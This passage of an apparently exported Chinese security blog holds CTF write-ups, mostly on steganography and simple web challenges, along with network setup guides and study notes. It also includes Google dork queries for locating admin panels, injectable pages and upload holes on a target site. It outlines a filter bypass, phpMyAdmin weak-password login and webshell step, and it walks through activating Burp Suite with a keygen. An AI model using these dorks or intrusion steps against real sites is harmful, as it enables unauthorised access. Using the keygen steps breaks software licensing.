class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span>:            height <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>struct.pack<span class="token punctuation">(</span><span class="token string">'>i'</span>, h<span class="token punctuation">))</span>            <span class="token keyword">for</span> <span class="token for-or-select variable">x</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>:                data<span class="token punctuation">[</span>x+4<span class="token punctuation">]</span> <span class="token operator">=</span> width<span class="token punctuation">[</span>x<span class="token punctuation">]</span>                data<span class="token punctuation">[</span>x+8<span class="token punctuation">]</span> <span class="token operator">=</span> height<span class="token punctuation">[</span>x<span class="token punctuation">]</span>            crc32result <span class="token operator">=</span> zlib.crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> crc32result <span class="token operator">==</span> crc32key:                print<span class="token punctuation">(</span><span class="token string">"宽为："</span>,end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                print<span class="token punctuation">(</span>width<span class="token punctuation">)</span>                print<span class="token punctuation">(</span><span class="token string">"高为："</span>,end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                print<span class="token punctuation">(</span>height<span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本和图片在用一目录下运行</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220219224552690.png"></p><p>得到宽高 在<strong>010Editor</strong>中修改宽高</p><p>保存得到图片下面出现不完整的二维码 </p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220219224840939.png"></p><p>用ps把右下角的正方形p到左上右上去</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220219224936116.png"></p><p>扫描得到flag</p><h3 id="0x03-汝闻，人言否"><a href="#0x03-汝闻，人言否" class="headerlink" title="0x03 汝闻，人言否"></a>0x03 汝闻，人言否</h3><p>下载后为Performance_art.zip，解压后为⼀张图⽚：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220223214727491.png"></p><p>百度银河语⾔，翻译过来为50 4B开头的⼆进制，⽣成压缩包后解压的到：<code>ZmxhZ3tnNUEwIWkyZjF9</code></p><p>base64解密得到：<code>flag&#123;g5A0!i2f1&#125;</code></p><h3 id="0x04-PERFORMANCE-ART"><a href="#0x04-PERFORMANCE-ART" class="headerlink" title="0x04 PERFORMANCE-ART"></a>0x04 PERFORMANCE-ART</h3><p>下载得到attach.zip，解压的到图⽚：汝闻,⼈⾔否.png，⽤010editor打开，发现png尾后⾯有追加数据，⽽且是KP开头，提取出<br>来修改⼀下得到压缩包。</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220223215237982.png"></p><p>压缩包发现有密码，提⽰为⼀段字符串：qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p，根据经验应该是键盘密码，得到解压密码<br>WVALOU，得到flag⽂件，⽂件头是RIFF，修改后缀为wav。<br>audacity.exe打开查看频谱得到flag：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220223215314033.png"></p><h3 id="0x05-WIRESHARK"><a href="#0x05-WIRESHARK" class="headerlink" title="0x05 WIRESHARK"></a>0x05 WIRESHARK</h3><p>下载压缩包后用<code>010Editor</code>打开发现在文件最后有张<code>png</code>图片 复制新建16进制文件另存为png格式</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220223210151489.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/666.png"></p><p>尝试用Wireshark解压 发现密码不正确 用Stegsolve查看lsb信息，发现隐藏另外⼀张png图⽚，提取出来得到⼀张⼆维码：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/111.png"></p><p>扫描得到<code>wrsak..iehr370</code> 凯撒密码解密得到<code>wireshark3.7.0</code> 解压压缩包得到wireshark⽂件，发现结尾是pdf特征，补<br>pdf头。得到pdf⽂件，利⽤wbstego得到flag<br>flag{Go0dJ0B_y0ufIndLt}</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="CLICK"><a href="#CLICK" class="headerlink" title="CLICK"></a>CLICK</h3><p>开启靶场 页面提示点击到28800次可以得到flag 骗人的 别信 别问我怎么知道的</p><p>按<code>F12</code>   找到调试器 主线程 static文件夹下<code>main.js</code></p><p>有一串可以的base64</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220219225407591.png"></p><p>解密得到flag</p><h3 id="web-sign-in"><a href="#web-sign-in" class="headerlink" title="web-sign in"></a>web-sign in</h3><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220219225526318.png"></p><p>在url后面加上&#x2F;robots.txt</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220219225629819.png"></p><p>访问fiag_ls_h3re.php</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220219225714400.png"></p><p>burpsuie抓包</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220219225844702.png"></p><p>得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Hacking</title>
      <link href="/2022/02/13/google-hacking-gu-ge-yu-fa/"/>
      <url>/2022/02/13/google-hacking-gu-ge-yu-fa/</url>
      
        <content type="html"><![CDATA[<h3 id="基础篇："><a href="#基础篇：" class="headerlink" title="基础篇："></a>基础篇：</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">* intitle：搜索网页标题中包含有特定字符的网页。例如intitle: 后台，这样网页标题中带有‘后台’的网页都会被搜索出来。* inurl：搜索包含有特定字符的URL。例如inurl:admin，可以用来查找网站后台。* intext: 搜索网页正文内容中的指定字符，例如intext:操作系统。可以搜索含有‘操作系统’的页面* Filetype: 搜索指定类型的文件。例如操作系统　filetype:pdf，就可以找到关于操作系统的pdf文档。* Site：找到与指定网站有联系的URL。例如Site：baidu.com。所有和这个网站有联系的URL都会被显示。* movie: 当我们用movie提交查询的时候，Google会返回跟查询关键词相关的电影信息。<span class="token punctuation">(</span>当前只支持英文Google<span class="token punctuation">)</span>* info: 查询网站的一些信息。例如info:bbs.byr.cn，它只会返回一个结果，是一个选择列表，列表的选项是这个网站的某一方面的信息。info<span class="token operator">=</span>cache+related+link+site+intext+intitle。* 双引号: 代表完全匹配，使关键词不分开，顺序都不能变。* 减号: 减号与前一个关键词之间一定要有一个空格，与后一个关键词之间一定不能有空格。搜索结果为，匹配前一个关键词但不匹配后一个关键词的结果。例如seo -搜索引擎。* AND: 逻辑与，这个命令我们其实一直都在用，只是没有意识到。一般用空格代替，还可以用“+”代替。例如霹雳布袋+败亡之剑，返回的结果同时包含两者。* weather: 查询某一地区或城市的天气。不过我们这一地区或城市必须是Google能识别的，例weather:beijing，Google将会给我们返回北京的天气。* 星号（*）: 通配符，可以匹配任意字符串。例如搜索*擎，则返回的结果中不仅有“搜索引擎”，还有“搜索巨擎”之类的。* allinurl: 结果的url中包含多个关键词。例如allinurl:byr jobs，等于inurl:byr inurl:jobs。allinurl也是排他性指令* define: 查询关键词的词义，起的是字典的作用。Google会返回包含查询关键词定义的网页，例define:computer，支持汉字哦！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶:"></a>进阶:</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">*</span> 查找后台地址：site<span class="token punctuation">:</span>域名inurl<span class="token symbol">:login</span><span class="token operator">|</span>admin<span class="token operator">|</span>manage<span class="token operator">|</span>member<span class="token operator">|</span>admin_login<span class="token operator">|</span>login_admin<span class="token operator">|</span>system<span class="token operator">|</span>login<span class="token operator">|</span>user<span class="token operator">|</span>main<span class="token operator">|</span>cms<span class="token operator">*</span> 查找文本内容：site<span class="token punctuation">:</span>域名 intext<span class="token punctuation">:</span>管理<span class="token operator">|</span>后台<span class="token operator">|</span>登陆<span class="token operator">|</span>用户名<span class="token operator">|</span>密码<span class="token operator">|</span>验证码<span class="token operator">|</span>系统<span class="token operator">|</span>帐号<span class="token operator">|</span>admin<span class="token operator">|</span>login<span class="token operator">|</span>sys<span class="token operator">|</span>managetem<span class="token operator">|</span>password<span class="token operator">|</span>username<span class="token operator">*</span> 查找可注入点：site<span class="token punctuation">:</span>域名 inurl<span class="token symbol">:aspx</span><span class="token operator">|</span>jsp<span class="token operator">|</span>php<span class="token operator">|</span>asp<span class="token operator">*</span> 查找上传漏洞：site<span class="token punctuation">:</span>域名 inurl<span class="token symbol">:file</span><span class="token operator">|</span>load<span class="token operator">|</span>editor<span class="token operator">|</span><span class="token constant">Files</span><span class="token operator">*</span> 查看脚本类型：site<span class="token punctuation">:</span>域名 filetype<span class="token symbol">:asp</span><span class="token operator">/</span>aspx<span class="token operator">/</span>php<span class="token operator">/</span>jsp<span class="token operator">*</span> 迂回策略：inurl<span class="token symbol">:cms</span><span class="token operator">/</span>data<span class="token operator">/</span>templates<span class="token operator">/</span>images<span class="token regex">/index/</span><span class="token operator">*</span> 网络设备关键词：intext<span class="token symbol">:WEB</span> <span class="token constant">Management</span> <span class="token constant">Interface</span> <span class="token keyword">for</span> <span class="token constant">H3C</span> <span class="token constant">SecPath</span> <span class="token constant">Series</span><span class="token operator">*</span> 存在的数据库：site<span class="token punctuation">:</span>域名 filetype<span class="token symbol">:mdb</span><span class="token operator">|</span>asp<span class="token operator">|</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">使用 &lt;kbd&gt;Ctrl&lt;&#x2F;kbd&gt;+&lt;kbd&gt;Alt&lt;&#x2F;kbd&gt;+&lt;kbd&gt;Del&lt;&#x2F;kbd&gt; 重启电脑<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 谷歌语法 </tag>
            
            <tag> Google Hacking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS 7网络配置</title>
      <link href="/2022/02/11/centos-7-wang-luo-pei-zhi/"/>
      <url>/2022/02/11/centos-7-wang-luo-pei-zhi/</url>
      
        <content type="html"><![CDATA[<p>一般情况下在 VM Ware中安装CentOS都是使用NAT模式连接网络 并且 CentOs安装完是无法上网的 需要手动惊醒配置</p><p>1.在VM Ware中选择“编辑”&gt;”虚拟网络编辑器” 弹出“虚拟网络编辑器弹窗” 选择更改设置</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220211205806847.png" alt="虚拟网络编辑器"></p><p>选择VMnet8 取消勾选“使用本地DHCP服务讲ip地址分给虚拟机” 子网IP可以自己改 只能第三个 </p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220211210302839.png"></p><p>选择NAT设置 设置网关 并且记住</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220211210341814.png"></p><p>2.右击状态栏中的WIFI图标</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220211210431712.png" alt="WIFI"></p><p>选择“打开网络和internet设置” </p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220211210551449.png" alt="打开网络和internet设置"></p><p>选择更改适配器选项 弹出“网络连接”对话框</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220211210720482.png" alt="网络连接"></p><p>选择“VM net8” 点击“属性” 选择“internet 协议版本4(TCP&#x2F;IPv6)”</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220211210905742.png" alt="internet 协议版本4(TCP/IPv6)"></p><p>设置为自定义ip</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220211210950500.png" alt="ip设置"></p><p>3.开启虚拟机 </p><p>输入 ip addr 查看一下网卡信息</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220211211316370.png" alt="网卡信息"></p><p>我们要找的是&lt;BROADCAST….&gt;这一个 记住前面的名字 如ens33</p><p>然后修改网卡的信息 输入命令</p><pre class="line-numbers language-none"><code class="language-none">vi &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  后面的ens33根据自己网卡名称来敲（按i键进入输入模式）</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220211211739097.png" alt="修改网卡信息"></p><pre class="line-numbers language-none"><code class="language-none">BOOTPROTO&#x3D;staticONBOOT&#x3D;yesIPADDR&#x3D;192.168.X.X      &#x2F;&#x2F;第一个X是网段 第二个X是虚拟机ipNETWASK&#x3D;255.255.255.0GATEWAY&#x3D;192.168.X.X   &#x2F;&#x2F;如192.168.129.2这里网关要跟前面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>NAT设置的相同</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220211210341814.png"></p><p>修改完后按ESC键 再输入</p><pre class="line-numbers language-none"><code class="language-none">:wq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>保存退出 </p><pre class="line-numbers language-none"><code class="language-none">ping www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试一下</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220211212639313.png" alt="测试成功"></p>]]></content>
      
      
      <categories>
          
          <category> CentOS 7 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CentOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu网络配置</title>
      <link href="/2022/02/11/ubuntu-wang-luo-pei-zhi/"/>
      <url>/2022/02/11/ubuntu-wang-luo-pei-zhi/</url>
      
        <content type="html"><![CDATA[<p>在&#x2F;etc&#x2F;netplan目录下查看文件</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220211232154043.png"></p><p>名称不固定 用vi编辑</p><p>打开后把内容全删掉 </p><pre class="line-numbers language-none"><code class="language-none">network:    ethernets:        ens33:                  # 配置的网卡名称            dhcp4: no           # 关闭dhcp4            dhcp6: no           # 关闭dhcp6            addresses: [192.168.0.120&#x2F;24]       # 设置本机IP地址及掩码            gateway4: 192.168.0.1               # 设置网关            nameservers:                    addresses: [114.114.114.114, 8.8.8.8]       # 设置DNS    version: 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编辑好ip和网关后直接粘贴</p><p>然后</p><pre class="line-numbers language-none"><code class="language-none">netplan apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启一下网卡 再ping一下百度即可</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burpsuite详细安装教程</title>
      <link href="/2022/01/24/burpsuite-xiang-xi-an-zhuang-jiao-cheng/"/>
      <url>/2022/01/24/burpsuite-xiang-xi-an-zhuang-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<p>视频教程：<a href="https://www.bilibili.com/video/BV16P4y1P7sL?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV16P4y1P7sL?spm_id_from=333.999.0.0</a></p><p>java下载链接：<a href="https://www.aliyundrive.com/s/HL5rN7mCydN">https://www.aliyundrive.com/s/HL5rN7mCydN</a></p><p>burpsuite下载链接：<a href="https://www.aliyundrive.com/s/JTUS6o8xE2T">https://www.aliyundrive.com/s/JTUS6o8xE2T</a></p><p>1.安装java环境 下载后安装 一直下一步 jdk81u31</p><p>2.测试java环境是否安装成功 cmd下java</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220124010845012.png"></p><p>3.找到burp-loader-keygen.jar文件，双击打开，</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/5698253-d754bdc9397e607e.png"></p><p>填一下License Text(随意)，然后点击Run即可启动BurpSuite的主程序</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/5698253-a0585639f3c2a6ca.png"></p><p>将keygen中得到的License复制粘贴到这里然后点击Next</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/5698253-87341ece85460e12.png"></p><p>点击这个后出现下一个界面</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/5698253-4c4f3fc949b49f16.png"></p><p>点击Copy request，复制完成之后，将字符串粘贴到keygen的Activation Request框里，然后Activation Response框里就有了结果，如下</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/5698253-d43cc7288bdf576e.png"></p><p>复制完后，将字符串粘贴到BurpSuite剩下的那个框里，如图</p><p><img src="https://upload-images.jianshu.io/upload_images/5698253-1a6e5e97856a91c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/518/format/webp"></p><p>再点击Next显示激活成功</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/5698253-6c8d0df3724743f9.png"></p><p>再次启动burpsuite时直接双击”1.bat”即可</p><p><strong>火狐安装foxyproxy</strong></p><p>点击浏览器右上角三条杠&gt;扩展与主题</p><p>输入框内输入<strong>foxyproxy</strong>搜索</p><p>选择第一个添加 浏览器右上角出现foxyproxy</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220124012242994.png"></p><p>点击选择 左边添加</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220124012322620.png"></p><p>设置代理和端口</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220124012352137.png"></p><p><strong>注意：端口要与burpsuite设置的端口相同</strong></p><p>burpsuite设置端口方式</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220124012505850.png"></p><p>浏览器挂代理即可进行抓包</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220124012604531.png"></p>]]></content>
      
      
      <categories>
          
          <category> 安装教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界</title>
      <link href="/2022/01/20/gong-fang-shi-jie-tang-mu-you-ge-hao-zhu-yi/"/>
      <url>/2022/01/20/gong-fang-shi-jie-tang-mu-you-ge-hao-zhu-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="汤姆有个好主意"><a href="#汤姆有个好主意" class="headerlink" title="汤姆有个好主意"></a>汤姆有个好主意</h2><p>下载是张图片 拖到kali里面binwalk发现有不少文件</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220120211750320.png"></p><p>然后foremost -T 文件名</p><p>得到一个压缩包 拖到windows中解压 有个hint提示跟两张一样的图片</p><p>hint翻译过来是<img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220120211947223.png"></p><p>找像素 那能想到的就合并 </p><p>steg.jar</p><p>合并完了</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220120212144431.png"></p><p>save 用ps打开 把曝光拉到最大 得到二维码</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220120212225497.png"></p><p>得到flag</p><h2 id="高手进阶-What-is-this"><a href="#高手进阶-What-is-this" class="headerlink" title="高手进阶 What-is-this"></a>高手进阶 What-is-this</h2><p>下载后一个压缩包</p><p>解压得到没有文件格式的文件</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220120162555770.png"></p><p>直接解压 解压完了发现还是没有格式的文件 连着重复三次 得到两个图片</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220120191710528.png"></p><p>使用stegsolve.jar打开图一 然后</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220120191813598.png"></p><p>然后选最后一个 打开图二</p><p>得到flag</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220120191912513.png"></p><p>主要是碰到了一个还没刷到过的题型 还是得多刷题</p><h2 id="web进阶-web-php-include"><a href="#web进阶-web-php-include" class="headerlink" title="web进阶 web_php_include"></a>web进阶 web_php_include</h2><p>进入题目</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/20200707163923303.png"></p><p>一串简短的PHP代码，这里对page这个参数用str_replace函数进行了过滤，str_replace函数的作用是匹配前面一段字符，匹配到的话就替换成后面一段，所以这里的代码意思就是，假如我们传入的page参数包含php:&#x2F;&#x2F;就会被替换成空字符。并且判断page里面文件是否存在，存在则包含文件。</p><p>当然这题有多种解法，我这里就讲述三种。</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a><strong>第一种</strong></h3><p>绕过str_replace函数，对渗透测试有点了解的都知道str_replace这个函数及其不安全，可以利用大小写绕过，双写绕过等，这里我用大小写绕过演示给大家看看。</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/20200707165806928.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/20200707165913410.png" alt="img"> </p><p>即可得到flag。</p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a><strong>第二种</strong></h3><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/20200707170147415.png"></p><p>这里还传入了一个hello，好奇心让我试了试。</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/20200707170249180.png"></p><p>我发现这个hello是有回显的，所以说不定这里可以命令执行然后回显到浏览器。</p><p>然后我们构造payload，首先要构造hello这个参数我们必须先让我们传进的page参数为真才行。</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/20200707171018153.png"></p><p>让page参数用http伪协议访问127.0.0.1这个条件肯定为真</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/20200707171441508.png"></p><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a><strong>第三种</strong></h3><p>用御剑扫描后台，会扫到phpmyadmin</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/20200707171629347.png"></p><p>试了试弱口令，账号root密码空还真登入进去了</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/20200707171732965.png"></p><p>接下来就是写入一句话了，这个自行百度了。</p>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF简单笔记</title>
      <link href="/2022/01/13/ctf-jian-dan-bi-ji/"/>
      <url>/2022/01/13/ctf-jian-dan-bi-ji/</url>
      
        <content type="html"><![CDATA[<p><strong>远程开启kali桌面命令：sudo &#x2F;etc&#x2F;init.d&#x2F;xrdp start</strong></p><p><strong>CTF：①Misc：杂项 ②Crypto：密码安全 ③Web安全 ④Reverse：逆向工程 ⑤Pwn</strong></p><p><strong>#杂项：</strong></p><pre class="line-numbers language-none"><code class="language-none">1、文件操作与隐写2、图片隐写术3、压缩文件处理4、流量取证技术<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1、文件操作与隐写"><a href="#1、文件操作与隐写" class="headerlink" title="1、文件操作与隐写"></a><strong>1、文件操作与隐写</strong></h2><p><strong>#命令就是一个对应的工具，只是这个工具没有对应的图形化界面而已</strong></p><pre class="line-numbers language-none"><code class="language-none">（1）、File：解析文件头（2）、winhex：十六进制文件编辑器（3）、010edit notepad++  （看头地址的前四个的值判断文件类型）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>#文件头缺失：</strong></p><p><strong>使用场景 文件头部残缺或文件头部字段错误无法打开正常文件（file 文件名 &#x3D;&#x3D; Data）</strong></p><p>   <strong>使用010edit，修复文件头</strong></p><p><strong>#文件分离操作：图片种子 把很多文件融合成一张图片</strong></p><pre class="line-numbers language-none"><code class="language-none">分析文件：binwalk 文件名分离文件：binwalk -e 文件名  遇到压缩包会进行自动解压foremost 文件名 -o 输出目录名使用dd实现文件的手动分离格式：dd if&#x3D;源文件 of&#x3D;目标文件名 bs&#x3D;1 count&#x3D;xx skip&#x3D;开始分离的字节数参数说明：if&#x3D;file  #输入文件名，缺省为标准输入of&#x3D;file  #输出文件名，缺省为标准输出bs&#x3D;bytes #同时设置读写块的大小为bytes，可以代替ibs和obsskip&#x3D;blocks #从输入文件开头跳过blocks个块后再开始复制count    #总共要读取count个块010edit：选中，右键，select，save selection将16进制字符文件导入保存操作方法：010edit：File 中的Import Hexagon另存为<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>#文件合并：</strong></p><pre class="line-numbers language-none"><code class="language-none">给一个MD5值计算文件的完整性1、Linux下的文件合并cat 文件1 文件2 文件3 &gt; 文件.xxx校验文件的md5值：(命令)md5sum 文件名2、Windows下的文件合并copy &#x2F;B 文件1+文件2+文件3  文件.xxxcertutil -hashfile 文件 md5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>#文件内容隐写：</strong></p><pre class="line-numbers language-none"><code class="language-none">查找功能<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、图片隐写术"><a href="#2、图片隐写术" class="headerlink" title="2、图片隐写术"></a><strong>2、图片隐写术</strong></h2><p><strong>#题型：</strong></p><pre class="line-numbers language-none"><code class="language-none">细微的颜色差别GIF图多帧隐藏1、颜色通道隐藏2、不同帧图信息隐藏3、不同帧对比隐写Exif信息隐藏图片修复1、图片头修复2、图片尾修复3、CRC校验修复4、长宽高修复最低有效位LSB隐写 8个进制位，将数据藏在最低有效位中图片加密1、Stegdetect2、outguess3、Jphide4、F5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>#常用工具：</strong></p><p><strong>1、Firework</strong>：查看隐写的图片文件<br><strong>2、Exif</strong>：打开属性（给提示）Windows<br>        <strong>exitfool 文件名 Linux</strong><br><strong>3、Stegsolve（隐写题）</strong>：两张图片的信息基本相同**<br>    修改打开方式：bin&#x2F;javaw.exe 修改注册表：HKEY_CLASSES_ROOT\Applications\javaw.exe\shell\open\command   在中间添加 -jar （需要空格）<br>    用来筛选最低有效位 Analyse–&gt;Data Extract–&gt;三基色：RGB<br><strong>4、zsteg需要在线安装（隐写）</strong>  root@kali:&#x2F;# gem install zsteg<br>    detect stegano-hidden data in PNG &amp; BMP<br>    检测LSB隐写   zsteg xxx.png&#x2F;bmp<br><strong>5、wbstego4工具（最低有效位）</strong>：针对.bmp&#x2F;.pdf**<br>    得到的_is文件用notepad++打开<br><strong>6、画图：图片格式转换</strong><br><strong>7、python脚本来处理</strong>（图片隐写LSB）<br><strong>8、TweakPNG</strong>：文件头正常却无法打开文件，利用TweakPNG修改CRC<br>    1、CRC校验错误<br>    2、高度错误导致CRC错误，需要修改高度.  计算脚本<br>        CRC上一行之后的8个字节，前四个为宽度，后四个为高度（十六进制下的第二行前八位）<br>    如果修改完CRC还没有获得flag，则为高度或者宽度问题，因为高度和宽度的改变引起了<br>    计算出来的CRC不正确，则在运行脚本时候的CRC为原本正确的CRC值<br><strong>9、Bftools</strong>：用于解密图片信息<br>    使用场景：在windows的cmd下，对加密过的图片文件进行解密<br>    格式：<br>    Bftools.exe decode braincopter 要解密的图片名称 -output 输出文件名<br>    Bftools.exe run 上一步输出的文件<br><strong>10、SlientEye</strong><br>    使用场景：windows下打开silentEye工具，对加密的图片进行解密<br>    方法：使用silentEye程序打开目标图片，点击image-&gt;decode，点击decode,可以查看隐藏文件，点击保存即可<br>    如果需要密码，勾选encrypted data，输入密码和确认密码，再点击decode<br>**11、Stegdetect工具探测加密方式：针对jpg<br>    命令：<br>        stegdetect xxx.jpg<br>        stegdetect -s 敏感度 xxx.jpg<br>    1)、Jphide<br>    2)、Outguess<br>        使用场景：Stegdetect识别出来或者题目提示是outguess加密的图片<br>        该工具需编译使用：.&#x2F;configure &amp;&amp; make &amp;&amp; make install<br>        格式：outguess -r 要解密的文件 输出结果的文件名<br>    3)、F5<br>        使用场景：Stegdetect识别出来是F5加密的图片或题目提示是F5加密的图片<br>        进入F5-steganography_F5目录，将图片文件拷贝至该目录下，从CMD进入该目录<br>        格式：Java Exrtact 要解密的文件名 -p 密码<br>        运行结果在目录下的output.txt看到</p><p><strong>#二维码处理：</strong></p><pre class="line-numbers language-none"><code 